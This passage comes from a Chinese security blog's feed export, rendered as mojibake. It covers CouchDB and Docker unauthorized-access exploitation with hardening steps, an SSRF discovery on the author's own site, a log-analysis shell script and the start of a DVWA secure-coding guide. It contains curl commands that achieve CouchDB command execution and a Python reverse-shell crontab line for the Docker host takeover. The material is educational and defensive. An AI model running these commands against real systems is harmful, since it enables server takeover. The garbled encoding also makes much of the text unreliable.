é»˜è®¤ç«¯å£ 50075httpfs é»˜è®¤ç«¯å£14000journalnode é»˜è®¤ç«¯å£ 8480b)YARNï¼ˆJobTrackerï¼‰ResourceManager é»˜è®¤ç«¯å£8088JobTracker é»˜è®¤ç«¯å£ 50030TaskTracker é»˜è®¤ç«¯å£ 50060c)Hue é»˜è®¤ç«¯å£ 8080d)YARNï¼ˆJobTrackerï¼‰master é»˜è®¤ç«¯å£ 60010regionserver é»˜è®¤ç«¯å£60030e)hive-server2 é»˜è®¤ç«¯å£ 10000f)spark-jdbcserver é»˜è®¤ç«¯å£ 10003 0x09 CouchDBæœªæˆæƒè®¿é—®9.1 æ¼æ´æè¿°CouchDBé»˜è®¤åœ¨5984ç«¯å£å¼€æ”¾Restfulçš„APIæ¥å£ï¼Œç”¨äºæ•°æ®åº“çš„ç®¡ç†åŠŸèƒ½ã€‚å…¶HTTP Serveré»˜è®¤å¼€å¯æ—¶æ²¡æœ‰è¿›è¡ŒéªŒè¯ï¼Œè€Œä¸”ç»‘å®šåœ¨0.0.0.0ï¼Œæ‰€æœ‰ç”¨æˆ·å‡å¯é€šè¿‡APIè®¿é—®å¯¼è‡´æœªæˆæƒè®¿é—®ã€‚ä»»ä½•è¿æ¥åˆ°æœåŠ¡å™¨ç«¯å£ä¸Šçš„äººï¼Œéƒ½å¯ä»¥è°ƒç”¨ç›¸å…³APIå¯¹æœåŠ¡å™¨ä¸Šçš„æ•°æ®è¿›è¡Œä»»æ„çš„å¢åˆ æ”¹æŸ¥ï¼Œå…¶ä¸­é€šè¿‡APIä¿®æ”¹local.inié…ç½®æ–‡ä»¶ï¼Œå¯è¿›ä¸€æ­¥å¯¼è‡´æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œè·å–æœåŠ¡å™¨æƒé™ï¼ 9.2 æ¼æ´åˆ©ç”¨æ–°å¢query_serveré…ç½®ï¼Œè¿™é‡Œæ‰§è¡Œifconfigå‘½ä»¤ curl -X PUT â€˜http://x.x.x.x:5984/_config/query_servers/cmdâ€˜ -d â€˜â€œ/sbin/ifconfig &gt;/tmp/6666â€â€˜ æ–°å»ºä¸€ä¸ªä¸´æ—¶è¡¨ï¼Œæ’å…¥ä¸€æ¡è®°å½• curl -X PUT â€˜http://x.x.x.x:5984/vultestâ€˜ curl -X PUT â€˜http://x.x.x.x:5984/vultest/vulâ€˜ -d â€˜{â€œ_idâ€:â€770895a97726d5ca6d70a22173005c7bâ€}â€™ è°ƒç”¨query_serverå¤„ç†æ•°æ® curl -X POST â€˜http://x.x.x.x:5984/vultest/_temp_view?limit=11â€˜ -d â€˜{â€œlanguageâ€:â€cmdâ€,â€mapâ€:â€â€}â€™ -H â€˜Content-Type: application/jsonâ€™ å½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼Œä¸‹è½½ä¸ªå…¶ä»–ä»€ä¹ˆçš„ 9.3 æ¼æ´åŠ å›º æŒ‡å®šCouchDBç»‘å®šçš„IP ï¼ˆéœ€è¦é‡å¯CouchDBæ‰èƒ½ç”Ÿæ•ˆï¼‰ åœ¨ /etc/couchdb/local.ini æ–‡ä»¶ä¸­æ‰¾åˆ° â€œbind_address = 0.0.0.0â€ ï¼ŒæŠŠ 0.0.0.0 ä¿®æ”¹ä¸º 127.0.0.1 ï¼Œç„¶åä¿å­˜ã€‚æ³¨ï¼šä¿®æ”¹ååªæœ‰æœ¬æœºæ‰èƒ½è®¿é—®CouchDBã€‚ è®¾ç½®è®¿é—®å¯†ç  ï¼ˆéœ€è¦é‡å¯CouchDBæ‰èƒ½ç”Ÿæ•ˆï¼‰ åœ¨ /etc/couchdb/local.ini ä¸­æ‰¾åˆ°â€œ[admins]â€å­—æ®µé…ç½®å¯†ç  0x10 Dockeræœªæˆæƒè®¿é—®10.1 æ¼æ´æè¿°Docker Remote APIæ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIã€‚é€šè¿‡ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ªAPIï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»ºcontainerï¼Œåˆ é™¤å·²æœ‰çš„containerï¼Œç”šè‡³æ˜¯è·å–å®¿ä¸»æœºçš„shell 10.2 æ¼æ´åˆ©ç”¨http://192.168.198.130:2375/v1.25/images/json å¯ä»¥è·å–åˆ°æ‰€æœ‰çš„ images åˆ—è¡¨ http://host:2375/containers/json ä¼šè¿”å›æœåŠ¡å™¨å½“å‰è¿è¡Œçš„ containeråˆ—è¡¨ï¼Œå’Œåœ¨docker CLIä¸Šæ‰§è¡Œ docker ps çš„æ•ˆæœä¸€æ ·ï¼Œè¿‡PoståŒ…æˆ‘ä»¬è¿˜å¯ä»¥æ–°å»ºã€å¼€å¯å’Œå…³é—­å®¹å™¨ï¼Œå…¶ä»–æ“ä½œæ¯”å¦‚æ‹‰å–imageç­‰æ“ä½œä¹Ÿéƒ½å¯ä»¥é€šè¿‡APIè°ƒç”¨å®Œæˆã€‚ 12345$ curl http://10.10.10.10:2375/containers/json[]docker -H=tcp://10.10.10.10:2375 ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES Docker remote Apiæœªæˆæƒè®¿é—®çš„æ”»å‡»åŸç†ä¸ä¹‹å‰çš„Redisæœªæˆæƒè®¿é—®æ¼æ´å¤§åŒå°å¼‚ï¼Œéƒ½æ˜¯é€šè¿‡å‘è¿è¡Œè¯¥åº”ç”¨çš„æœåŠ¡å™¨å†™æ–‡ä»¶ï¼Œä»è€Œæ‹¿åˆ°æœåŠ¡å™¨çš„æƒé™ï¼Œå¸¸è§çš„åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹: 1ã€å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½å®¿ä¸»æœºçš„/root/ç›®å½•ï¼Œä¹‹åå°†æ”»å‡»è€…çš„sshå…¬é’¥~/.ssh/id_rsa.pubçš„å†…å®¹å†™åˆ°å…¥å®¿ä¸»æœºçš„/root/.ssh/authorized_keysæ–‡ä»¶ä¸­ï¼Œä¹‹åå°±å¯ä»¥ç”¨rootè´¦æˆ·ç›´æ¥ç™»å½•äº† 2ã€å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼ŒæŒ‚è½½å®¿ä¸»æœºçš„/etc/ç›®å½•ï¼Œä¹‹åå°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°/etc/crontabä¸­ï¼Œæ”»å‡»è€…ä¼šå¾—åˆ°ä¸€ä¸ªåå¼¹çš„shellï¼Œå…¶ä¸­åå¼¹shellè„šæœ¬çš„æ ·ä¾‹å¦‚ä¸‹ï¼š1echo -e &quot;*/1 * * * * root /usr/bin/python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&apos;\n&quot; &gt;&gt; /etc/crontab ç¬¬2ç§åˆ©ç”¨æ–¹æ³•ä¹Ÿå¯ä»¥æŒ‚è½½var/spool/cron/ç›®å½•ï¼Œå°†åå¼¹shellçš„è„šæœ¬å†™å…¥åˆ°/var/spool/cron/rootï¼ˆcentosç³»ç»Ÿï¼‰æˆ–/var/spool/cron/crontabs/root(ubuntuç³»ç»Ÿ) 10.3 æ¼æ´åŠ å›º åœ¨ä¸å¿…éœ€çš„æƒ…å†µä¸‹ï¼Œä¸è¦å¯ç”¨dockerçš„remote apiæœåŠ¡ï¼Œå¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„åŠ å›ºæ–¹å¼ï¼š 12è®¾ç½®ACLï¼Œä»…å…è®¸ä¿¡ä»»çš„æ¥æºIPè¿æ¥ï¼›è®¾ç½®TLSè®¤è¯ï¼Œå®˜æ–¹çš„æ–‡æ¡£ä¸ºProtect the Docker daemon socket å®¢æˆ·ç«¯è¿æ¥æ—¶éœ€è¦è®¾ç½®ä»¥ä¸‹ç¯å¢ƒå˜é‡export DOCKER_TLS_VERIFY=1 123export DOCKER_CERT_PATH=~/.dockerexport DOCKER_HOST=tcp://10.10.10.10:2375export DOCKER_API_VERSION=1.12 åœ¨ docker api æœåŠ¡å™¨å‰é¢åŠ ä¸€ä¸ªä»£ç†ï¼Œä¾‹å¦‚ nginxï¼Œè®¾ç½® 401 è®¤è¯ é™„ï¼šPythonæœªæˆæƒè®¿é—®è„šæœ¬å‚è€ƒæ–‡ç« https://www.secpulse.com/archives/55928.html https://www.secpulse.com/archives/49115.html https://www.secpulse.com/archives/6540.html https://xianzhi.aliyun.com/forum/mobile/read/750.html https://book.thief.one/webying-yong-lou-dong/136-elasticsearchwei-shou-quan-fang-wen-lou-dong.html https://www.secpulse.com/archives/2166.html https://github.com/findys/sunburst/ https://yeasy.gitbooks.io/docker_practice/ å®‰å…¨è„‰æé“¾æ¥æœªæˆæƒè®¿é—®æ¼æ´æ€»ç»“]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>ç¼–ç¨‹</tag>
        <tag>Python</tag>
        <tag>æœªæˆæƒè®¿é—®</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å®‰å…¨è„‰ææ¼æ´æŒ–æ˜å°è®°]]></title>
    <url>%2F2017%2F08%2F07%2F%E5%AE%89%E5%85%A8%E8%84%89%E6%90%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ä¸çŸ¥é“å¤§å®¶ä¹‹å‰å¯¹å®‰å…¨è„‰ææ‰“å¼€çš„æ—¶å€™æ˜¯ä¸æ˜¯æ„Ÿè§‰å“åº”å¾ˆæ…¢ï¼Œæ‰€ä»¥æœ€è¿‘ä¸€ç›´åœ¨æ’æŸ¥ï¼Œç„¶åé‡æ–°æ›´æ¢wordpressä¸»é¢˜è¿›è¡Œæ”¹ç‰ˆå‡çº§ã€‚åœ¨å¯¹å®‰å…¨è„‰æè¿›è¡Œç»´æŠ¤ã€æ›´æ–°çš„æ—¶å€™ï¼Œå¶ç„¶ä¹‹é—´å‘ç°äº†è„‰æä¸Šçš„å‡ ä¸ªæ¼æ´ï¼Œåœ¨æ­¤è®°å½•ä¸‹ã€‚ é¦–å…ˆï¼Œæ‰“å¼€ä¸»é¡µã€‚ æ‰“å¼€æŸä¸ªç½‘ç«™ä¸çŸ¥é“å¤§å®¶æœ‰ä»€ä¹ˆä¹ æƒ¯ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªâ€ç¨‹åºå‘˜â€çš„æˆ‘æ¥è¯´(ä¼ªç¨‹åºå‘˜,æˆ‘æœ€å–œæ¬¢æœ‰äººå«æˆ‘ç¨‹åºå‘˜äº†)ï¼ŒF12æ²¡å…³è¿‡ã€‚[æ–œçœ¼ç¬‘] ä¸çŸ¥é“å¤§å®¶çœ‹è¿™ä¸ªå›¾ä¹‹åæ•ä¸æ•æ„Ÿï¼Œåæ­£æˆ‘æ˜¯æŒºæ•æ„Ÿçš„(è®©æˆ‘è£…ä¸ªé€¼)ã€‚ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™ä¹ˆä¹…äº†ç«Ÿç„¶æ²¡äººå‘ç°â€¦ è¦æ˜¯ä½ ä½ å’‹ç©ï¼Œé¦–å…ˆæˆ‘æ¥äº†ä¸ªç™¾åº¦https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png&amp;h=304&amp;w=504&amp;zc=1 æƒŠå–œæ¥äº†ï¼Œç«Ÿç„¶æŠŠç½‘ç«™ç»å¯¹è·¯å¾„æŠ¥å‡ºæ¥äº†ï¼ä¿¡æ¯æ¯”è¾ƒæ•æ„Ÿï¼Œæˆ‘å°±ä¸æ”¾å›¾äº†ã€‚ è¿™å°±å­˜åœ¨ä¸¤ä¸ªæ¼æ´äº†ï¼š æ²¡æœ‰å…³é—­é”™è¯¯å›æ˜¾ æ²¡æœ‰å¯¹srcå‚æ•°çš„é™æ€æ–‡ä»¶é“¾æ¥ä½œæ ¡éªŒ ç„¶åçœ‹åˆ°srcå‚æ•°ï¼Œå¤§å®¶ä¼šæƒ³åˆ°å•¥ï¼Œæ²¡é”™ï¼SSRFï¼ æ¥ä¸€æ³¢è¯•è¯• æ²¡æ¯›ç—…ï¼ ç„¶åæˆ‘å°±æƒ³ç€ è¿™æ˜¯ä¸æ˜¯ä¸ªé€šç”¨æ¼æ´å•Šï¼Œæ²¡å‡†æ‹¿ä¸ªCVEå‘¢(ä¸è¦æ­ç©¿æˆ‘ï¼Œè®©æˆ‘æ„æ·«ä¸€ä¼š)ï¼Œç„¶åæˆ‘æœäº†ä¸‹ï¼Œç«Ÿç„¶çœŸæ²¡æœ‰è¿™ä¸ªæ’ä»¶çš„SSRFæ¼æ´ï¼Œä½†æ˜¯ï¼ï¼ï¼æ‚²ä¼¤çš„æ˜¯æˆ‘å‘ç°ç«Ÿç„¶ä¸ç»´æŠ¤æ›´æ–°äº†ã€‚ã€‚ã€‚å¥½å§ã€‚ã€‚ ç„¶åæœäº†ä¸€ä¸‹è¿™ä¸ªæ’ä»¶çš„å…¶ä»–æ¼æ´ï¼Œç«Ÿç„¶å‘ç°ä¸ªå‘½ä»¤æ‰§è¡Œï¼å˜¿å˜¿å˜¿å˜¿å˜¿ã€‚ã€‚ã€‚ ä¸è¯´äº†ï¼Œå››çˆ·åœ¨æˆ‘èº«è¾¹å‘¢ï¼Œæˆ‘æ€•è¢«æ‰“æ­»ã€‚ PS:å¤§å®¶ä¸è¦ç©äº†ï¼Œå·²ç»ä¿®å¤äº†ã€‚ã€‚ã€‚]]></content>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>æ¼æ´æŒ–æ˜</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[çœ‹æˆ‘å¦‚ä½•ç”¨20è¡Œä»£ç åšæ—¥å¿—åˆ†æ]]></title>
    <url>%2F2017%2F07%2F29%2F%E7%9C%8B%E6%88%91%E5%A6%82%E4%BD%95%E7%94%A820%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%81%9A%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[ä¸ç®¡æ˜¯æ¸—é€æµ‹è¯•ã€åº”æ€¥å“åº”è¿˜æ˜¯è¿ç»´ï¼Œæ—¥å¿—åˆ†æéƒ½ä¸‡åˆ†é‡è¦ã€‚è€Œlinuxä¸‹æ—¥å¿—åˆ†ææœ€å¥½çš„å·¥å…·é‚£å°±æ˜¯linuxè‡ªå¸¦çš„å„ç§å‘½ä»¤äº†ã€‚æœ¬æ–‡å°†ä»ä¸€ä¸ªå°ä¾‹å­æ¥ä»‹ç»â€å¦‚ä½•ç”¨linuxå‘½ä»¤åšæ—¥å¿—åˆ†æâ€ã€‚ 0x00 æºç 1234567891011121314151617181920212223242526272829#!/bin/bashif ls ./*.result &amp;&gt; /dev/nullthen rm *.resultfitouch log.resultfor i in www-*.logdo echo $i ... awk &apos;$9 == 200 &#123;print $7&#125;&apos; $i|grep -i &apos;^/admin/upload/.*\.html$&apos;|sort|uniq -c|sed &apos;s/^ *//g&apos; &gt; $i.result cat $i.result &gt;&gt; log.result echo $i.result finisheddoneecho final.log.result ...sort -k2 log.result | uniq -f1 --all-repeated=separate |./log.awk |sort -rn &gt; final.log.resultecho final.log.result finishedlog.awk#!/usr/bin/awk -fBEGIN&#123; RS=&quot;&quot;&#125; &#123; sum=0 for(i=1;i&lt;=NF;i++)&#123; if((i%2)!=0)&#123; sum += $i&#125; &#125; print sum,$2 &#125; 0x01 Apacheæ—¥å¿—ä»¥apacheæ—¥å¿—ä¸ºä¾‹ï¼Œä¸‹é¢æ˜¯ä¸‰æ¡æ™®é€šçš„apacheæ—¥å¿—è®°å½•ã€‚12358.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html HTTP/1.1&quot; 200 4649 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;58.40.124.211 - - [25/Jul/2017:08:53:12 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/js/jquery-2.2.4.min.js HTTP/1.1&quot; 200 85578 &quot;http://121.43.182.76/vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.html&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot;58.40.124.211 - - [25/Jul/2017:08:53:13 +0800] &quot;GET /vulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/favicon.ico HTTP/1.1&quot; 200 1517 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0&quot; 58.40.124.211è¡¨ç¤ºè®¿é—®è€…IPï¼Œ25/Jul/2017:08:53:12 +0800è¡¨ç¤ºæ—¶é—´ï¼ŒGETè¡¨ç¤ºè¯·æ±‚æ–¹æ³•ï¼ŒvulApps_plat/pentest/e31010629c1cb5aa4252c3832f77ed77/index.htmlè¡¨ç¤ºè®¿é—®çš„åœ°å€ï¼ŒHTTP/1.1è¡¨ç¤ºä½¿ç”¨HTTPåè®®çš„1.1ç‰ˆæœ¬ï¼Œ200è¡¨ç¤ºå“åº”çŠ¶æ€ç ï¼ŒMozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0è¡¨ç¤ºè®¿é—®è€…user-agent æˆ‘ä»¬åˆ†æä¸€èˆ¬å…³æ³¨çš„ä¸»è¦å°±æ˜¯ï¼š IPåœ°å€ è®¿é—®çš„åœ°å€ çŠ¶æ€ç  æœ¬æ¬¡å°±åªæ¼”ç¤ºè·å–æŸä¸ªåœ°å€çš„è®¿é—®é‡å¹¶æ’åºï¼Œå³ï¼šè®¿é—®é‡ åœ°å€è¿™ç§æ•ˆæœã€‚ 0x02 æ€è·¯Apacheæ—¥å¿—æ–‡ä»¶æ ¼å¼å½¢å¦‚201707029.log,æ ¹æ®æ–‡ä»¶æ ¼å¼è®¾è®¡æ€»ä½“æ€è·¯å¦‚ä¸‹: å¤„ç†æ¯å¤©çš„æ—¥å¿—ï¼Œç»Ÿè®¡æ¯æ—¥æ–‡ç« è®¿é—®é‡ ç”Ÿæˆæ¯æœˆè®¿é—®ç»“æœï¼Œç»Ÿè®¡æœˆåº¦è®¿é—®é‡ ç”Ÿæˆæ¯å¹´è®¿é—®ç»“æœï¼Œç»Ÿè®¡å¹´åº¦è®¿é—®é‡ 0x03 å‘½ä»¤è§£æ0x03.1 awkawk &#39;$9 == 200 {print $7}&#39; $i awké»˜è®¤æ˜¯ä»¥ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦ï¼Œ$9è¡¨ç¤ºåŒ¹é…æ˜¯200çš„å“åº”ï¼Œæ‰“å°å‡ºç¬¬ä¸ƒä¸ªå­—æ®µ 0x03.2 grepgrep -i &#39;^/admin/upload/.*\.html$&#39; æ ¹æ®awkåŒ¹é…çš„ç»“æœï¼ŒåŒ¹é…è®¿é—®çš„åœ°å€æ˜¯/admin/upload/.*\.htmlçš„è®°å½•ã€‚iè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ï¼Œ^$æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„å¼€å¤´ç»“å°¾ã€‚ 0x03.3 sortsort -k2 log.result ç”±äºåˆæˆçš„è®°å½•æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥è¦å°†ç›¸åŒçš„å½’ç±»ã€‚ä½†æ˜¯ç¬¬ä¸€å­—æ®µæ˜¯è®¿é—®æ¬¡æ•°ï¼Œæ‰€ä»¥ä½¿ç”¨k2å‚æ•°æ ¹æ®ç½‘å€æ’åºã€‚sort -rn &gt; final.log.result å¯¹awkè„šæœ¬çš„å¤„ç†ç»“æœè¿›è¡Œæ’åºï¼Œsorté»˜è®¤ä½¿ç”¨ç¬¬ä¸€ä¸ªå­—æ®µï¼Œå‚æ•°rè¡¨ç¤ºé€†åºï¼Œä»å¤§å¾€å°æ’ï¼›å‚æ•°nè¡¨ç¤ºä»¥æ•°å€¼å½¢å¼æ’åº 0x03.4 uniquniq -c ä½¿ç”¨uniqè¿‡æ»¤é‡å¤çš„è®°å½•ï¼Œ-cè¡¨ç¤ºæ·»åŠ è¯¥è®°å½•å‡ºç°çš„æ¬¡æ•°ã€‚uniq -f1 --all-repeated=separate å‚æ•°f1è¡¨ç¤ºå¿½ç•¥ç¬¬ä¸€ä¸ªå­—æ®µï¼ˆè®¿é—®æ¬¡æ•°ï¼‰ï¼Œåªè€ƒè™‘åé¢çš„å­—æ®µï¼ˆç½‘å€ï¼‰ã€‚å‚æ•°all-repeated=separateï¼Œè¡¨ç¤ºè¿‡æ»¤æ‰æ‰€æœ‰åªå‡ºç°ä¸€æ¬¡çš„è®°å½•ï¼Œä¿ç•™æ‰€æœ‰é‡å¤çš„è®°å½•ï¼Œå¹¶ä¸”æ¯ä¸€ç»„ä¹‹é—´ç”¨ä¸€ä¸ªç©ºè¡Œåˆ†éš” 0x03.5 sedsed &#39;s/^ *//g&#39; &gt; $i.result ç”±äºuniqè¿‡æ»¤åæ¯æ¡è®°å½•å‰é¢éƒ½æ˜¯æœ‰ç©ºæ ¼çš„ï¼Œæ‰€ä»¥è¦å…ˆåˆ é™¤æ‰ã€‚sedå‘½ä»¤æ˜¯ä¸€ä¸ªå¤„ç†è¡Œæ–‡æœ¬çš„ç¼–è¾‘å™¨ï¼Œ&#39;s/^ *//g&#39;æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼(^å’Œ*ä¹‹é—´æœ‰ä¸€ä¸ªç©ºæ ¼)è¡¨ç¤ºæ¯è¡Œè®°å½•çš„ç©ºæ ¼æ›¿æ¢ä¸ºç©ºï¼ˆå³åˆ é™¤ï¼‰å¹¶å°†æ’åºç»“æœé‡å®šå‘åˆ°æ–‡ä»¶ã€‚ 0x03.6 &gt;å’Œ&gt;&gt;&gt;è¡¨ç¤ºé‡å®šå‘ï¼Œå³è¾“å‡ºè¦†ç›–ï¼Œ&gt;&gt;ä¹Ÿæ˜¯é‡å®šå‘ï¼Œä½†æ˜¯æ˜¯è¡¨ç¤ºè¿½åŠ  0x03.7 log.awké¦–å…ˆï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œawkå°†â€\nâ€ä½œä¸ºè®°å½•çš„åˆ†éš”ç¬¦ï¼Œè®¾ç½®RS=â€â€è¡¨ç¤ºæ”¹ä¸ºå°†ç©ºè¡Œä½œä¸ºåˆ†éš”ç¬¦å…¶æ¬¡ï¼ŒNFæ˜¯ä¸€ä¸ªawkçš„å†…ç½®å˜é‡ï¼Œè¡¨ç¤ºå½“å‰è¡Œçš„å­—æ®µæ€»æ•°ã€‚ç”±äºè¾“å…¥æ–‡ä»¶ä¹‹ä¸­ï¼Œæ¯ä¸€è¡Œéƒ½åŒ…å«ä¸¤ä¸ªå­—æ®µï¼Œç¬¬ä¸€ä¸ªæ˜¯è®¿é—®æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯ç½‘å€ï¼Œæ‰€ä»¥è¿™é‡Œåšä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œåªè¦æ˜¯å¥‡æ•°å­—æ®µå°±ç´¯åŠ ï¼Œå¶æ•°å­—æ®µåˆ™ä¸€å¾‹è·³è¿‡ã€‚æœ€åï¼Œæ¯ä¸ªè®°å½•è¾“å‡ºä¸€ä¸ªç´¯åŠ å€¼å’Œç½‘å€ï¼Œå®ƒä»¬ä¹‹é—´ç”¨ç©ºæ ¼åˆ†å‰²ã€‚ å‚è€ƒæ–‡ç« ï¼šhttp://www.cnblogs.com/51linux/archive/2012/05/23/2515299.htmlhttp://blog.csdn.net/long2746004900/article/details/53367353http://www.cnblogs.com/wangqiguo/p/5863266.htmlhttp://blog.csdn.net/github_33736971/article/details/54286736http://blog.csdn.net/wenxuechaozhe/article/details/52564394http://www.cnblogs.com/dong008259/archive/2011/12/07/2279897.html]]></content>
      <tags>
        <tag>ç¼–ç¨‹</tag>
        <tag>è‡ªåŠ¨åŒ–</tag>
        <tag>linux</tag>
        <tag>åº”æ€¥å“åº”</tag>
        <tag>æ—¥å¿—åˆ†æ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è·Ÿç€DVWAå­¦Webå®‰å…¨å¼€å‘]]></title>
    <url>%2F2017%2F07%2F10%2F%E8%B7%9F%E7%9D%80DVWA%E5%AD%A6Web%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[æœ¬æ–‡å·²å‘å¸ƒåˆ°â€œå®‰å…¨è„‰æâ€ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://www.secpulse.com/archives/59262.html 0x00 å‰è¨€ DVWAï¼ˆDamn Vulnerable Web Applicationï¼‰æ˜¯ä¸€ä¸ªç”¨æ¥è¿›è¡Œå®‰å…¨è„†å¼±æ€§é‰´å®šçš„PHP/MySQL Webåº”ç”¨ï¼Œæ—¨åœ¨ä¸ºå®‰å…¨ä¸“ä¸šäººå‘˜æµ‹è¯•è‡ªå·±çš„ä¸“ä¸šæŠ€èƒ½å’Œå·¥å…·æä¾›åˆæ³•çš„ç¯å¢ƒï¼Œå¸®åŠ©webå¼€å‘è€…æ›´å¥½çš„ç†è§£webåº”ç”¨å®‰å…¨é˜²èŒƒçš„è¿‡ç¨‹ã€‚ æœ¬æ–‡å°†ä»DVWAä¸­åŒ…å«çš„å„ç§æ¼æ´æ¥å­¦ä¹ åŸºæœ¬çš„Webå®‰å…¨å¼€å‘ä¸­çš„éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼Œæœ¬æ–‡æ—¨åœ¨ä¸ºWebå¼€å‘ä¸­çš„æ–°æ‰‹æä¾›ä¸€äº›å®‰å…¨æŒ‡å—ï¼ŒæŠ›ç –å¼•ç‰ï¼Œæœ›å¤§ç‰›ä»¬å¤šå¤šæŒ‡ç‚¹ã€‚ 0x01 SQLæ³¨å…¥1ã€ä½¿ç”¨mysql_real_escape_stringå‡½æ•°ï¼Œä¸è¦ä½¿ç”¨addslashesmysql_escape_stringå·²ç»è¢«å¼ƒç”¨ï¼Œä¸»è¦è¯´ä¸‹mysql_real_escape_stringå’Œaddslashesçš„åŒºåˆ«1.1 è¿™ä¸¤ä¸ªå‡½æ•°éƒ½ä¼šå¯¹&#39;ã€&quot;ã€\å’Œ\x00è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œé™¤æ­¤ä¹‹å¤–mysql_real_escape_stringè¿˜ä¼šå¯¹\rã€\nå’Œ\x1aè¿›è¡Œè½¬ä¹‰ã€‚1.2 åœ¨å­—ç¬¦é›†ä¸ºGBKæ—¶ï¼Œ0xbf27ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„å¤šå­—èŠ‚å­—ç¬¦ï¼Œä½†0xbf5cå´æ˜¯,è‹¥æˆ‘ä»¬è¾“å…¥0xbf27addslashesä¼šå°†å®ƒä¿®æ”¹ä¸º0xbf5c27ï¼Œ0xbf5cä¼šè¢«å½“ä½œå•å­—èŠ‚å­—ç¬¦ï¼Œæ‰€ä»¥æˆåŠŸæ³¨å…¥ä¸€ä¸ªå•å¼•å·ï¼Œè¿™å°±æ˜¯å®½å­—èŠ‚æ³¨å…¥ã€‚2ã€ä½¿ç”¨is_numericå‡½æ•°ï¼Œä½†æ˜¯å¦‚æœå•ä½¿ç”¨is_numericå‡½æ•°æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºä½¿ç”¨åå…­è¿›åˆ¶ã€ç§‘å­¦è®°æ•°æ³•å³å¯è½»æ¾ç»•è¿‡ã€‚3ã€ä½¿ç”¨PDOæŠ€æœ¯ï¼ŒPDOæ˜¯PHPæ•°æ®å¯¹è±¡ï¼ˆPHP Data Objectï¼‰çš„ç¼©å†™ï¼Œå³ä½¿ç”¨å®ƒçš„å‡†å¤‡è¯­å¥ï¼ˆPrepared Statementsï¼Œå³â€œå‚æ•°åŒ–æŸ¥è¯¢â€ï¼‰ã€‚ä¸¾ä¸ªä¾‹å­ï¼š1234567$Statement = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);$id = 18;$name = &apos;w2n1ck&apos;;$Statement-&gt;bindParam(1,$id);$Statement-&gt;bindParam(2,$name);$Statement-&gt;execute();$Statement-&gt;fetchAll(); PHPä¼šå°†å°†SQLæ¨¡æ¿select * from info where id =? and name = 